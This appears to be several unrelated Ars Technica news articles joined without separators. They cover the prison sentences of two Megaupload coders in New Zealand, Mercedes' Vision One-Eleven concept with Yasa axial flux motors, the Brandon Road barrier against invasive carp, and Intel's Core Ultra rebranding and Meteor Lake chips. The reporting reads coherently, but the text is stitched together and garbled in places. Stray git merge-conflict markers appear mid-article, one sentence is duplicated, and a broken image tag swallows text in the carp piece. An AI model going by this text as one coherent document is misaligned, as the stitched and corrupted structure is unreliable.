<div><a name='page-1'></a></div>
<p>Two Megaupload coders were sentenced to prison in New Zealand yesterday after pleading guilty to fraud and promising to testify against former Megaupload CEO Kim Dotcom, the <a href="https://www.nzherald.co.nz/nz/megaupload-coders-sentenced-to-prison-after-home-detention-bid-denied/OACYX734XREW3KPA6N5LWKLHYM/">New Zealand Herald reported</a>.</p>
<p>Mathias Ortmann, a former chief technology officer who held 25 percent of Megaupload shares, was sentenced to two years and seven months. Bram van der Kolk, who led Megaupload software programming and held 2.5 percent of Megaupload shares, was sentenced to two years and six months.</p>
<p>Ars could not immediately reach Ortmann's and van der Kolk's lawyers to comment. The High Court in Auckland did not immediately respond to Ars' request to review the judgment.</p>
<p>According to the Herald, Justice Sally Fitzgerald downgraded the coders' sentences from 10 years to current sentences due to "guilty pleas, assistance to the FBI, and rehabilitation efforts."</p>
<p>The deals will allow the coders to serve these significantly lighter sentences than expected in New Zealand rather than being extradited to the United States. Dotcom is still fighting extradition to the US.</p>
<p>In response to sentencing, <a href="https://twitter.com/KimDotcom/status/1669203088224452608?cxt=HHwWgIDUua3XmaouAAAA">Dotcom tweeted</a> that "the conclusion from these light sentences should be" not to extradite him to the US "to face 185 years in jail."</p>
<p>"My legal team says that my co-defendants in the Megaupload case are eligible for parole after 10 months and will likely get parole as part of the deal they made with the US," <a href="https://twitter.com/KimDotcom/status/1669214546131849218?cxt=HHwWhMDUwaXynqouAAAA">Dotcom tweeted</a>. "They will serve less than a year instead of the 185 years we were charged with. Good for them."</p>
<p>Dotcom also <a href="https://twitter.com/KimDotcom/status/1669203006242562048?cxt=HHwWgIDR0crSmaouAAAA">suggested</a> that the coders' sentence could "be converted to home detention in a few months," calling the sentences "a slap on the wrist."</p>
<p>Ars could not immediately reach Dotcom for comment, but his tweet thread also <a href="https://twitter.com/KimDotcom/status/1669218419621900289?cxt=HHwWgsDRoeHToKouAAAA">claimed</a> that he considered "the best part" of this week's sentencing was that it seemed to contradict US government statements deeming the Megaupload case “the biggest copyright case in history.”</p>
<p>"My co-defendants were not sentenced for copyright crimes, but for ‘fraud,’" Dotcom tweeted. "No copyright infringement."</p>
<p>Both Ortmann and van der Kolk have briefly deferred the start of their prison sentences until August 1. The former requested to be present for the birth of his child, and the latter requested to spend time with his "seriously ill" mother, the Herald reported.</p>
<h2>Dotcom: Coders “have been through hell”</h2>
<p>Dotcom <a href="https://twitter.com/KimDotcom/status/1669203083006730241?cxt=HHwWgoDTyYbXmaouAAAA">tweeted</a> that he doesn't blame Ortmann and van der Kolk for striking deals with the US government.</p>
<p>"They have been through hell," Dotcom tweeted.</p>
<p>The sentencing comes 11 years after their arrest and Megaupload's forced shutdown after an FBI raid dismantled the site for attracting 4 percent of Internet traffic by providing "easy access to copyrighted films, music, television shows, and video games," the Herald reported.</p>
<p>The scheme allegedly cost rights holders more than half a billion dollars, and Fitzgerald said it was clear to the court that Ortmann and van der Kolk helped Megaupload in its "deliberate attempt to disguise the copyright infringement," the Herald reported. The pair pled guilty to participating in this fraud.</p>
<div><a name='page-2'></a></div>
<p>Ars covered nearly every twist and turn of the <a href="https://arstechnica.com/series/series-megaupload/">Megaupload controversy</a> over the past decade. Throughout the saga, Dotcom has fought extradition while attempting to stay in business as a New Zealand judge deemed the FBI raid a "<a href="https://arstechnica.com/tech-policy/2013/05/kim-dotcom-raid-yielded-miscarriage-of-justice-nz-judge-rules/">miscarriage of justice</a>;" Dotcom <a href="https://arstechnica.com/tech-policy/2013/09/kim-dotcom-sues-new-zealand-for-7-million-over-illegal-spying-raid/">sued New Zealand</a> over illegal spying; a judge <a href="https://arstechnica.com/tech-policy/2014/02/new-zealand-appeals-court-reverses-ruling-that-megaupload-warrants-were-illegal/">reversed the ruling</a> that the FBI raid was illegal; Dotcom <a href="https://arstechnica.com/tech-policy/2014/11/kim-dotcom-im-officially-broke-after-transferring-remaining-assets/">declared he was broke</a>; new <a href="https://arstechnica.com/tech-policy/2017/08/new-zealand-illegally-spied-on-dotcom-associates-court-rules/">spying revelations emerged</a>; and Dotcom twice <a href="https://arstechnica.com/tech-policy/2016/07/kim-dotcom-to-reboot-megaupload/">relaunched Megaupload</a>.</p>
<p>The courtroom was packed at this week's sentencing, the Herald reported, as the coders' lawyer, Grant Illingworth QC, argued that his clients made a "poor decision" participating in the Megaupload scheme. Illingworth said both coders had since worked hard to show remorse for their crimes and rehabilitate through their honest business effort, a cloud storage business called <a href="https://careers.mega.nz/people/608019-mathias-ortmann">Mega</a>.</p>
<p>The judge was asked to consider that Mega has remained "fully compliant" with the law and now has 200 employees and more than 280 million users. These stakeholders could all be negatively affected if Ortmann and van der Kolk served prolonged sentences and the company collapsed, Illington said.</p>
<p>“To apply a heavily punitive penalty would send the wrong message," Illington argued. "Others should be encouraged to follow the example they have set over the last decade of their lives.”</p>
<p>Representing the New Zealand Crown, prosecutor David Boldt pushed back on this characterization, according to the Herald. Boldt argued that Ortmann and van der Kolk "were central" to Megaupload's copyright-infringing operation, which he described as "the most serious" worldwide "criminal conspiracy" that "is possible to imagine."</p>
<p>“This fraud dwarfs anything seen in New Zealand before," Boldt said. "Even the illicit revenues Megaupload generated amounted to around $300 million.”</p>
<p><a href="https://twitter.com/KimDotcom/status/1669203083006730241?cxt=HHwWgoDTyYbXmaouAAAA">Dotcom tweeted</a> that Ortmann and van der Kolk struck deals "not because they actually believe that they are criminals" but because "they were tired of fighting and gave up in exchange for a 98.5 percent discount of the 185 years we were charged with" in the US.</p>
<p>As part of the deals, Ortmann and van der Kolk agreed to testify against Dotcom and "others charged in the Megaupload case."</p>
<p>Ars could not immediately reach Illington for comment.</p>
<p>The 2012 FBI raid originally resulted in extradition attempts on Ortmann and van der Kolk, as well as Dotcom and Megaupload marketing director Finn Batato, who died of cancer last year, the <a href="https://www.nzherald.co.nz/nz/kim-dotcom-pays-tribute-to-megaupload-marketing-director-finn-batato-who-has-died-after-cancer-battle/ESI7YDUT4JBFYIWL25NSTTSE7E/">New Zealand Herald reported</a>.</p>
<p>Dotcom has remained supportive of his remaining co-defendants, even as they stand to testify against him. Now, he remains the top Megaupload target for the US Department of Justice.</p>
<p>"My fight goes on," Dotcom said, according to <a href="https://www.reuters.com/world/asia-pacific/new-zealand-court-sentences-megaupload-coders-prison-report-2023-06-15/">Reuters</a>.</p>

<p>CARLSBAD, CALIF.—In 1969, a couple of short months after humans first walked on the surface of the moon, Mercedes-Benz debuted a revolutionary new concept car at that year's Frankfurt auto show. Called the C111, this orange-and-black coupe featured dramatic gullwing doors but also served as a testbed for new technology, including a four-rotor Wankel rotary engine. Now, 54 years later, it has drawn inspiration from that car for its newest concept, the Vision One-Eleven. It, too, is orange, and it also showcases new technology—in this case very small and lightweight axial flux electric motors.</p>

<p>Axial flux motors aren't exactly new—most optical drives use them, for example, but they're not very common in automotive applications. The one-off <a href="https://arstechnica.com/cars/2022/04/driving-the-jeep-magneto-an-electric-concept-with-a-manual-transmission/">Jeep Magneto</a> used axial flux motors, as do production hybrid supercars from <a href="https://arstechnica.com/cars/2020/03/1200-uncomfortable-miles-in-a-gorgeous-acura-nsx-hybrid-supercar/">Acura</a>, <a href="https://arstechnica.com/cars/2022/06/driving-mclarens-new-plug-in-hybrid-supercar-the-2023-artura/">McLaren</a>, and <a href="https://arstechnica.com/cars/2022/12/the-2023-ferrari-296-gts-we-drive-ferraris-plug-in-hybrid-convertible/">Ferrari</a>. In the case of the Italian OEM, it sources the motors from Yasa, a British company that was <a href="https://www.ft.com/content/4dd01709-cf31-4e13-8876-f8f7ab148149">acquired by Mercedes in 2021</a>.</p>
<p>Like the much more common radial flux motor, an axial flux motor uses magnets (in this case, permanent magnets), soft iron to transport the flux, copper as the material that's connected to the inverter, and an aluminum housing.</p>
  <ul class="gallery shortcode-gallery gallery-wide">

      </li>
      </ul>

<p>"However, that's where the similarity ends," said Tim Woolmer, who founded Yasa in 2009 to commercialize his PhD research. "So in a radial flux machine, the flux travels out from the permanent magnets into the stator, around the stator yoke and then it drops back into the rotor forming a loop. So the flux in the airgap is traveling radially, hence the name "radial flux machine," he explained.</p>
<p>"On the axial flux machine with two discs and one stator, the flux in this case basically travels from rotor to rotor straight through the stator, then travels around the back steel in the rotor and then back again through the stator through a different coil," Woolmer said.</p>
<div><a name='page-2'></a></div>
<<<<<<< HEAD
<p>Woolmer's PhD involved a soft magnetic composite material—in Yasa's motor this lives in segments, bound in copper coils, within the stator. He took that approach initially because of the difficulty of compressing the composite material together into large enough pieces. Making a whole motor stator in the same way one would for a radial flux motor would have required a 4,000-ton press. Instead, the smaller pieces only needed 210 tons of pressure.</p>

<p>"And that's really when the eureka moment happened," he told Ars. "Because the flux goes straight through the stator and then around in the rotor and then back again through the stator... you don't need, magnetically, the stator yoke at all." The yokeless and segmented armature design also lent Yasa its name.</p>
<p>Yasa's axial flux motors are a third the size and mass of an equivalently powerful radial flux motor, and in 2015, six of them had a combined output of 1 megawatt, sufficient power <a href="https://arstechnica.com/cars/2015/07/1-megawatt-electric-car-sets-a-new-record-at-pikes-peak-hillclimb/">to take Rhys Millen to the top of Pikes Peak in what was then a record</a>. And the technology proved perfect for Ferrari when it went looking for an electric motor that could fit between the engine and gearbox in its SF90 hypercar.</p>
<p>"Ferrari had a really interesting problem, which is, for center of gravity reasons, they want their crank height to be as low as possible, so they only had 105 millimeters of radius on the machine," Woolmer said. "And they also only had about 65 millimeters of axial length—any more and the car got longer. So they had literally a package volume of about two, two and a half liters to fit."</p>

<p>Mercedes is happy to continue supplying Yasa motors to Ferrari and other specialized OEMs, but it bought the company to use the technology itself. Which brings us back to the Vision One-Eleven. If the car that inspired it was created originally to test out new powertrain ideas, then so, too, does this new one, which imagines an axial flux motor for each rear wheel and a battery pack using the same chemistry as the cells you'd find inside Lewis Hamilton's Formula 1 car.</p>
<p>At least you would if the powertrain was feature-complete, <a href="https://arstechnica.com/cars/2022/07/we-test-an-electric-mercedes-that-can-can-go-747-miles-on-a-single-charge/">like the hyper-efficient EQXX we drove last summer</a>. We'll see a production version of that concept's powertrain in the brand's next EV architecture, due to appear in a cheaper Mercedes EV in 2024. The ideas that the Vision One-Eleven imagines are a little farther away, however; Mercedes isn't at the point where it's going to announce an all-electric sports car going into production.</p>
<p>The concept doesn't just imagine a new high-performance EV powertrain. The user interface features augmented reality, demoed to us with the help of a Magic Leap headset. A 3D map can extend out into space from the infotainment screen, for instance, or AR could render parts like the A pillar or door transparent to the driver, removing blind spots. They're impressive ideas, assuming the tech matures to the point it's actually feasible.</p>

They're impressive ideas, assuming the tech matures to the point it's actually feasible.</p>

<p>Meanwhile, axial flux motors might start appearing in production Mercedes EVs toward the end of the decade. "In particular, when you look into the motor, if it gets smaller and smaller, more and more powerful, and lighter, you don't have to occupy the center of a vehicle any longer," said Konstantin Neiss, who's in charge of Mercedes' electric drive unit development.</p>
<p>Moving the motors closer to the driven wheels would free up internal space, which might be used for more battery or more cargo volume. The much smaller mass and size of an axial flux motor may even result in an EV with hub-mounted motors; I've grown old waiting for one of those to make it past the prototype stage using radial flux motors.</p>

<p>Over the past 50-some years, invasive carp, a stunningly destructive invasive species, have infested almost every waterway in the Midwest, from South Dakota to beyond the Mississippi Delta, and have even reached West Virginia. In some waters, it has been <a href="https://www.theleafchronicle.com/story/news/local/clarksville/2020/02/17/asian-carp-how-bright-new-idea-became-invasive-fish-nightmare/4786152002/">reported</a> that around 90 percent of the fish are invasive carp; in one section of the Illinois River, a Mississippi tributary, they make up more than 75 percent of the total biomass in the water. They are obnoxious invaders, overwhelming other fish species, muddying clear waters, and—in some cases—jumping out of the water when startled. A passing boat can throw hundreds of fish into a frenzy, creating an <a href="https://youtu.be/nc-e8EGkLMo">airborne blizzard</a> of 25-pound lunkers that have broken the arms and jaws of recreational boaters.</p>
<p>So far, however, the prolific fish have mostly stopped short of the Great Lakes, blocked by the subtle ridge of a continental divide that circles the lakes’ southern and western shores. Water to the west and south of the ridge flows to the Mississippi River and the Gulf of Mexico. Water to the east and north flows to the Great Lakes, which contain about 20 percent of the world’s surface fresh water and attract boating, fishing, and other recreation, which all together have been estimated to generate between $14 billion and $42 billion a year.</p>
<p>But the fish, formerly called Asian carp, could still find a way in. There is a single year-round connection between those two main watersheds of eastern North America: the Chicago Sanitary and Ship Canal.</p>
<p>The canal opened to commercial shipping in 1900, and an extension was built seven years later; among the unintended consequences was the creation of a route for invasive species like the carp to move into vast new territories. It connects Lake Michigan and the Chicago River to the Des Plaines River, which pours into the Illinois River, which is lousy with invasive carp.</p>
<p>At the Brandon Road Lock and Dam, south of Joliet, Illinois, below where the canal and Des Plaines River meet, there is a choke point, a 110-foot wide channel and lock through which the carp must pass to get to the Great Lakes. There, the Army Corps of Engineers is mustering about $1.2 billion taxpayer dollars to build a barrier that will, hypothetically, stop the carp from getting to the lakes.<!--adbreak--></p>

<p>Experts say that keeping the fish out is worth the price. “It would be a cataclysmic event,” said Greg McClinchey, legislative affairs and policy director of the <a href="http://www.glfc.org/">Great Lakes Fishery Commission</a>, contemplating the arrival of invasive carp in the lakes. “As expensive as any project might be, the cost of failure is much higher.” (The commission is also working with partners in Ohio to control invasive grass carp that have established a small breeding population in the <a href="https://www.cleveland.com/news/2022/10/going-after-grass-carp-in-lake-erie-now-before-its-too-late.html">Lake Erie watershed</a>, but these fish are not as big of a threat as other invasive carp species.)</p>
<p>What is officially called the Brandon Road Interbasin Project is, in effect, the Great Lakes’ last line of defense. It will be a gauntlet of barriers that will take years to install and use a variety of technologies, from electric shocks to curtains of bubbles, to inflict sufficient discomfort on the advancing carp that they may turn around and leave the Great Lakes alone.</p>
<p>“I have great hope that the technologies will work,” said Molly Flanagan, chief operating officer of the nonprofit <a href="https://greatlakes.org/">Alliance for the Great Lakes</a>. “One open question is whether we can build them fast enough.”</p>
<p>There are four types of invasive carp: bighead, silver, grass, and black. Although the exact date of the invasive carp’s introduction is unclear, the fish were deliberately introduced into the United States, possibly in the early 1960s, first as a sport fish and then, improbably, as the solution to an environmental problem: the heavy use of herbicides to clear weeds from catfish farms in the Mississippi Delta. The bottom feeding carp would root up weeds and consume floating algae.</p>
<p>“The understanding was that there was no way these fish could reproduce in this environment,” said Brian Schoenung, the aquatic nuisance species program manager for the Illinois Department of Natural Resources. “It was a great way to cut back the chemicals.”</p>
<p>In the early 1970s, flooding liberated thousands of the imported carp from the catfish ponds, washing them into tributaries of the Mississippi. It turns out that they reproduced in American waters just fine, and they soon wreaked havoc on the waterways and native species. “It is the <a href="https://undark.org/2021/05/12/how-to-poison-a-feral-pig/">pig</a> of the fish world,” wrote outdoor writer Mark C. Dilts of the carp, “rooting around in a weed bed, which it will eventually destroy as habitat for other fish. Its plowing around on bottom muddies the water so sunlight cannot penetrate to stimulate future plant growth.”</p>

<p>Before the passage of the federal Clean Water Act in 1972, transit of invasive species through the Chicago Sanitary and Ship Canal wasn’t an issue. The roughly 30-mile passage—which, when it was built, reversed the flow of the Chicago River so the city’s sewage would flow south rather than out into the city’s drinking water in Lake Michigan—was so polluted fish couldn’t survive in it. But the act, more or less, cleaned up American waterways and lowered pollution in the canal sufficiently that a few hardy species started to appear.</p>
<p>Among the fish moving into the canal was the <a href="https://nas.er.usgs.gov/queries/factsheet.aspx?SpeciesID=713">round goby</a>, an aggressive and voracious Eurasian native that came to the Great Lakes in the bilgewater—water pumped out of a ship’s hull—of oceangoing freighters.</p>
<p>Looking for a way to keep the round goby from spreading into the Mississippi River basin, experts considered dozens of possible solutions, including the introduction of “biological pathogens” into the ecosystem, using superheated water from power plants to make the fish uncomfortable, poisoning the waterways, and just plain shutting the canal down. In 1996, Congress authorized the Army Corps to develop a fish barrier, and the Corps’ advisory panel settled on building something reminiscent of the invisible fences that contain dogs in backyards: a barrier that would use electrical pulses to convince the fish to turn back.</p>
<p>The Army Corps identified a location near the town of Romeoville, Illinois, for the construction of the first barrier. Inconveniently, the goby turned up well downstream of the Romeoville site just as the project started. On the assumption that some variation of the same problem was going to pop up in the future, the project was changed from a deployment aimed at one species to a testbed to see how electric pulses would work on a broader range of fish.<!--adbreak--></p>
<p>During the study period, scientists tagged and planted 130 common, locally captured carp in the canal. They monitored the carp to see how they reacted to the electrical pulses. (And, by sheer chance, to see how human beings reacted as well. One barge crew, despite warning signs, tried to tie up near the facility using metal cable. The connection threw a 12-inch spark, which could have blown the barge up had it been carrying more volatile cargo.)</p>
<p>Only one fish made it past the electrodes during the test, apparently as a hitchhiker in the space between barges as they pushed up the canal. Also of concern was the fact that the system experienced, as electrical systems often do, periodic outages, the longest of which was 56 hours, long enough to let whole schools of fish through.</p>
<p>When the test ended, observers from the American Fisheries Society, a nonprofit organization for fisheries professionals, concluded, “The electric barrier is at best a partial solution.” While the <a href="https://ilrdss.isws.illinois.edu/pubs/govconf2005/session4c/Chuck%20Shea.pdf">final report</a> from the operators of the barrier called their work “reliable technology to repel fish without killing them,” it also suggested that further implementation might benefit from the inclusion of other types of deterrents, including air bubbles and sound, to repel fish.</p>
<p>For more than 30 years, the Army Corps and its partners have been contemplating and experimenting with different kinds of barriers to keep invasive carp out of Lake Michigan. During that time, there have been scares. <a href="https://undark.org/2020/03/11/environmental-dna-asian-carp/">Invasive carp DNA</a> seems ever-present in the canal and even in the lake itself, and has so far been traced to benign sources. But more recently, in August 2022, a fisherman <a href="https://news.wttw.com/2022/08/06/invasive-carp-captured-lake-calumet-just-7-miles-lake-michigan">reported</a> a silver carp in Lake Calumet on the upstream side of Brandon Road Lock and Dam, only seven miles from Lake Michigan. The nightmare was that the carp had, like the round goby before it, bypassed the barrier being built to stop it.</p>
<p>In response, government agents launched a fleet of small boats in search of the carp—which they caught—and to see if there were others. After a couple of weeks and no additional carp found, everyone heaved a sigh of relief.</p>
<p>“Every time that happens, I think it’s like a siren going off to remind us we’re at risk,” said Flanagan. “We shouldn’t ignore it when we find a single fish,” she added. “Every time we should pay attention and know that we need to get these protections in place.”</p>

<p>Soon after that scare, Illinois and Michigan inserted items into their proposed state budgets that will pour <a href="https://www.mlive.com/public-interest/2023/02/michigan-illinois-propose-114m-toward-invasive-carp-fortifications.html">$114 million</a> into Brandon Road, covering the local match necessary to start the next tranche of federal funds flowing. (The funds from Illinois were recently signed into law, while those from Michigan have yet to be appropriated.) The barrier, previously conceived as a $778 million project, has ballooned to roughly $1.2 billion.</p>
<p>As the project is currently envisioned, a fish moving upstream will have to negotiate a half-mile-long series of obstacles. Each of the obstacles is intended to turn back the vast majority of carp so that the number of carp diminishes to near zero as fish push upstream. If any reach the open water above the lock, the researchers believe, there will not be enough to find each other, let alone establish a breeding population. The multiple lines of defense also provide layers of redundancy in case one of the systems malfunctions.</p>
<p>“There’s not one silver bullet that stops all fish,” said Mark Cornish, a senior technical specialist and biologist for the Army Corps, which is especially true when the waterway also has to remain open to boats and other vessels.</p>
<p>Near the downstream entrance to the lock’s main channel, fish will encounter what Army Corps senior researcher Christa Woodley called “the first line of defense.” It is a combination of the barrier types recommended after the experimental installation at Romeoville: a thick curtain of air bubbles and an array of underwater speakers that blast noises at frequencies and volumes that drive invasive carp away.<!--adbreak--></p>
<p>“We’re learning we’re effective. We’ve learned we have very little impact on native species, which is wonderful,” she said. "We play different patterns and frequencies all mimicking things that are in the environment and that we’ve seen affect them.”</p>
<p>Working on a test array in the Mississippi River near Keokuk, Iowa, Woodley and her team have tagged thousands of fish and monitored their movements around the barrier’s underwater speakers. She estimated that the acoustic deterrents drive back 99.5 percent of invasive carp and that further tweaks could eventually increase that to 99.9 percent.</p>
<p>With thousands of fish in the river, it means a few will get through. Those carp will find themselves in a reengineered channel. For several hundred yards it will be, basically, a concrete box free of anything like fish habitat. There will be no outcrops behind which fish can rest against the river’s current, no food sources, and—from the fish’s point of view—nothing enticing them forward.</p>

        </div>
      </li>
      </ul>

<p>Nonetheless, there will inevitably be a few fish adventurers who press on, and just before they reach the lock itself, they will encounter an electric deterrent much like the one tested at Romeoville. It will cause approaching fish to tingle unpleasantly and, if they push farther into the electrode array, be stunned so they can’t swim against the current. Those fish will, theoretically, be carried back downstream.</p>
<div><a name='page-4'></a></div>
<p>On the off chance that a few fish make it through all of that and into the lock itself, there is a second, larger acoustic array. And if any fish try to hitchhike in the space between the barges like the one rogue carp did during the Romeoville test, the lock itself is being reengineered as what is called a “flushing lock” that physically pushes even the tiniest organisms back downstream.</p>
<p>The lock currently “creates turbulent flows,” said Cornish. “If you were a floating organism, it would swirl you around, but wouldn’t necessarily push you out of the lock. The flushing lock moves things out of the lock” and back downstream.</p>
<p>And if, after all of that, some fish continues to fight its way against the canal current toward Lake Michigan, it will run into the electric array at Romeoville 10 miles from Brandon Road Lock and Dam—a long swim for a tired fish.</p>
<p>As important as the barriers are, Schoenung emphasizes the impact of “non-structural components,” which is what he calls the anti-carp activities that are currently taking place.</p>
<p>“Barriers are useful, but in conjunction with other things,” said Schoenung. “I don’t think we can discount the non-structural work that goes on in keeping the reproductive front downstream, because I don’t know that you can design a barrier that would prevent all classes of carp from getting through.”</p>
<p><div class="image shortcode-img right medium"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/fish-6.jpg"><img alt='There are four types of invasive carp: bighead, silver, grass, and black.

A significant public education campaign has raised awareness of the carp.</p>
<p>But the most striking non-structural activity is catching carp. Up and down the Mississippi and its tributaries, carp are being pulled out of the water at a fantastic rate. In Kentucky, for example, more than 9 million pounds of carp were harvested in both 2021 and 2022. On the Illinois River downstream from Brandon Road Lock, 10 million pounds have been harvested since 2019, said Schoenung.</p>
<p>The Illinois Department of Natural Resources has built a marketing campaign around eating invasive carp, which is popular across Asia, in hopes that consumer demand will increase commercial fishing, even rebranding the fish as “copi” (a play on the word “copious”) as part of the effort.</p>
<p>“We’re having some measurable impact with our commercial harvest program to suppress those numbers a bit. It’s hard to quantify,” said Schoenung. “There’s a huge number of variables to take into account, and you have to ask are we better off allocating resources to remove fish, or studying the impact of removing fish? There’s not enough money to do both.”</p>
<p>The effect of all that activity is to reduce population pressure for the carp to seek new habitat, which is important because, according to the current plan, actual construction on the project doesn’t begin until October 2024 and won’t be complete until July 2029.</p>
<p>“We want to protect the Great Lakes as quickly as we possibly can. We try to implement the most easily constructed things as fast as we can,” said Cornish. “We want to get those things that have a likelihood of happening and working installed quickly, and work on the others. That buys us a little wiggle room.”<!--adbreak--></p>
<p>The first phase, the installation of the bubble curtain and narrow acoustic array at the downstream entrance to the channel, will theoretically be completed in late 2026. Phase 2 will bring online the enlarged electric array and the second acoustic barrier, along with the reengineering of the lock so that it flushes fish downstream as barges pass. The final phase, which includes rebuilding the channel so it is inhospitable to passing fish, will require the temporary shutdown of barge traffic, and perhaps some blasting of bedrock to make room for improved deterrent systems. If all goes according to plan, construction will be complete in mid-summer of 2029.</p>
<p>Today, invasive carp are regularly captured one dam downriver from Brandon Road, about 15 miles away. That is not thought to be a breeding population, however. The nearest confirmed breeding population is 55 miles downstream at Starved Rock Lock and Dam.</p>
<p>The advance of the carp seems to have slowed. “A little bit of creep” is how Schoenung described the carp’s current movement. Schoenung attributed that to the non-structural efforts being made all over the Mississippi Basin. And the game, for now, is to buy time while the Army Corps builds its barriers.</p>
<p>Then hope the whole thing works.</p>

<div><a name='page-1'></a></div>
<p>As part of an effort to "simplify the Intel brand portfolio," Intel has announced some changes to its processor branding starting with its next-generation Meteor Lake CPUs.</p>
<p>The smallest change is that Intel's mainstream CPUs are losing their "i," shifting from Core i3/i5/i7/i9 to simply Core 3/5/7/9. Intel will also stop using "generational" messaging in its processor branding—none of the new CPUs will be announced, released, or advertised as "14th-generation" anything.</p>

<p>Intel's generational branding has always been a bit arbitrary, anyway. The "first-generation" Core chips followed several generations of Core and Core 2 processors, the branding Intel started using for its chips in the mid-2000s at the end of the Pentium 4 era. And the Core 2 Duo and Core 2 Quad branding was used for several distinct generations of chips that used different manufacturing technologies and revised architectures.</p>
<<<<<<< HEAD
<p>To make up for the words it's removing from its branding, Intel is also adding a new one. Its mainstream processors will now be known simply as Core 3, Core 5, and Core 7. But its high-end chips will be called Core Ultra 5, Core Ultra 7, or Core Ultra 9. The company didn't go into detail about what makes a processor Ultra, though we do know that Core 3 chips <em>cannot<strong> </strong></em>be Ultra, while Core 9 chips can <em>only</em> be Ultra.</p>
<div class="image shortcode-img center full"><img alt='Processors will still have a &quot;14&quot; in the model number to denote their generation.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/intel-ultra-03-scaled.jpeg" alt='Processors will still have a &quot;14&quot; in the model number to denote their generation.' ><p class="caption" style="font-size:0.8em">Processors will still have a "14" in the model number to denote their generation. (credit: Intel)</p></div>

<p>Intel's CPU model numbers will continue to include generational numbering to help distinguish them from one another, and the company will continue to use suffix letters to distinguish different product segments from one another. So what would have been an "Intel Core i7-14700K Processor" might now be an "Intel Core Ultra 7 processor 14700K" (Intel says it prefers the word "processor" to sit in between the "Core Ultra 7" part and the CPU's model number).</p>
<p>This is part of a wider shake-up of Intel's processor branding strategy; last year, the company <a href="https://arstechnica.com/gadgets/2022/09/the-new-intel-processor-will-replace-pentium-and-celeron-cpu-branding-in-2023/">jettisoned the Pentium and Celeron brand names for low-end laptop CPUs</a>. It now refers to those Intel processors as Intel Processors. AMD has also rejiggered its laptop processor model numbers to account for the fact that it's shipping <a href="https://arstechnica.com/gadgets/2022/09/amd-is-making-laptop-cpu-model-numbers-simultaneously-less-and-more-confusing/">several totally different CPU and GPU pairings</a> under the same "Ryzen 7000" umbrella.</p>

<h2>What we know about Meteor Lake</h2>
<p>Meteor Lake's branding change is actually probably the least important of the architecture's many changes—there are several historic firsts here, hidden among the expected CPU and GPU performance improvements.</p>
<p>Much of what's remarkable about Meteor Lake pertains to how the chip will be manufactured and packaged. It will be Intel's first consumer CPU to use a chiplet-based design (Intel calls them "tiles"). This means Intel will be breaking its processors up into several silicon dies that use different manufacturing technologies with the goal of improving performance and efficiency.</p>

<<<<<<< HEAD
<p>This comes with benefits and drawbacks—you need to make sure those tiles can communicate just as quickly as they could if they were all part of the same piece of silicon, but you can also mix-and-match manufacturing processes to improve performance and power efficiency while reducing costs. Intel will be using <a href="https://arstechnica.com/gadgets/2018/12/intel-introduces-foveros-3d-die-stacking-for-more-than-just-memory/">Foveros technology</a> to make Meteor Lake work; Foveros stacks chiplets directly on top of one another, facilitating quick communication between them while also reducing the amount of physical space needed for packaging.</p>
<p>The main CPU tile in Meteor Lake will continue to use a hybrid approach, combining large high-performance P-cores and small efficiency E-cores. This tile is being manufactured by Intel itself, on the company's new Intel 4 manufacturing process; current 13th-generation CPUs are made using Intel 7, which Intel has been using and refining since 2019 or so. But others, including the GPU tile, <a href="https://www.tomshardware.com/news/intel-details-3d-chip-packaging-tech-for-meteor-lake-arrow-lake-and-lunar-lake">are being manufactured by TSMC</a>, something that would have been unthinkable for Intel just a few years ago. The company's <a href="https://arstechnica.com/gadgets/2022/10/intel-a770-a750-review-strong-gpu-alternatives-that-we-very-nearly-recommend/">Arc GPUs</a> are also being manufactured by TSMC.</p>
<p>Intel claims that it will get its manufacturing back on track in the next few years, after largely squandering the lead it had a decade ago because of trouble with its 14 nm and 10 nm processes (Intel 7 is another name for a version of its 10 nm process). It also hopes to attract third-party clients to use its chip fabs, opening up an important and <a href="https://arstechnica.com/information-technology/2023/04/intel-loses-2-8-billion-in-another-not-great-quarter-down-36-year-over-year/">much-needed</a> new revenue stream. For what it's worth, the company does seem to be <a href="https://arstechnica.com/gadgets/2021/07/intels-foundry-roadmap-lays-out-the-post-nanometer-angstrom-era/">more or less on track to hit its original deadlines</a> for the Intel 4 process, even if it is leaning on TSMC to help it get actual products to market.</p>

<p>Speaking of the TSMC-made graphics tile, Meteor Lake will be Intel's biggest GPU upgrade in years, after using similar Iris Xe GPUs in the 11th, 12th, and 13th-generation chips. The Meteor Lake graphics chiplet is <a href="https://www.anandtech.com/show/17264/intel-meteor-lake-client-processors-to-use-arc-graphics-chiplets">based on the same Alchemist architecture</a> as Intel's current Arc A-series dedicated graphics cards.

<p>The other big addition will be <a href="https://www.anandtech.com/show/18878/intel-discloses-new-details-on-meteor-lake-vpu-block-lays-out-vision-for-client-ai">hardware acceleration for AI workloads</a>. Generative AI has attracted a deafening amount of buzz in the last year or so, but Meteor Lake's AI acceleration will be a bit more like the "<a href="https://machinelearning.apple.com/research/neural-engine-transformers">Neural Engine</a>" that Apple has been building into its A- and M-series chips for years now, or what <a href="https://arstechnica.com/gadgets/2023/05/amd-is-ready-to-launch-its-twice-delayed-ryzen-7000-chips-for-lightweight-laptops/">AMD</a> and <a href="https://developer.qualcomm.com/software/qualcomm-neural-processing-sdk">Qualcomm</a> have included in some of their recent processors.</p>
<p>Though it can be used for language models and <a href="https://machinelearning.apple.com/research/stable-diffusion-coreml-apple-silicon">image generation</a>, Apple has mostly used this hardware to do relatively simple, straightforward things like matching faces among photos in users' camera rolls, transcribing voicemails, and separating foreground and background objects in photos and video streams. The ability to accelerate these kinds of workloads means that more processing can be done locally on your device without sending data to be crunched on by some server somewhere, though ultimately it will probably be Microsoft that determines exactly how this hardware is used.</p>

<p>Desktop users may need to wait to benefit from any of these changes and improvements. Current rumors <a href="https://wccftech.com/intel-raptor-lake-refresh-cpus-reportedly-part-of-14th-gen-desktop-family/">suggest</a> that many 14th-generation desktop chips will be yet another revision of the Alder Lake architecture originally introduced in the 12th generation. The 13th-generation <a href="https://arstechnica.com/gadgets/2022/09/intels-first-13th-gen-core-cpus-include-few-surprises-but-many-cores/">Raptor Lake chips</a> improved the architecture with a larger number of E-cores, higher clock speeds, and (in some models) more cache memory. Another Alder Lake revision will probably use similar methods to increase performance, though early rumors suggest the chips will also come with increased power use, and power efficiency is already a weak point for Intel's desktop chips relative to AMD's and especially Apple's.</p>
